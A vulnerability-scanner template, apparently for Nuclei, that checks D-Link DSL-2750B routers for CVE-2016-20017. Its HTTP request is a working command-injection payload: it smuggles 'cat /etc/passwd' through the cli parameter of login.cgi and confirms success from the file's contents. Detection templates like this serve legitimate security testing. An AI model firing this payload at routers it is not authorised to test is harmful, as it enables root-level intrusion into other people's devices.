id: CVE-2016-20017

info:
  name: D-Link DSL-2750B - Unauthenticated Remote Command Execution (KEV)
  author: ritikchaddha
  severity: critical
  description: |
    D-Link DSL-2750B routers (firmware 1.01 to 1.03) are vulnerable to unauthenticated remote command execution via the cli parameter in login.cgi. An attacker can inject OS commands and execute arbitrary code as root.
  reference:
    - https://seclists.org/fulldisclosure/2016/Feb/53
    - https://nvd.nist.gov/vuln/detail/CVE-2016-20017
  classification:
    cve-id: CVE-2016-20017
    cwe-id: CWE-78
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  metadata:
    verified: true
    max-request: 1
    vendor: dlink
    product: dsl-2750b
    kev: true
    fofa-query: body="DSL-2750B"
  tags: cve,cve2016,dlink,kev,rce,router

http:
  - raw:
      - |
        GET /login.cgi?cli=multilingual%20show%27;cat%20/etc/passwd%27$ HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"

      - type: status
        status:
          - 200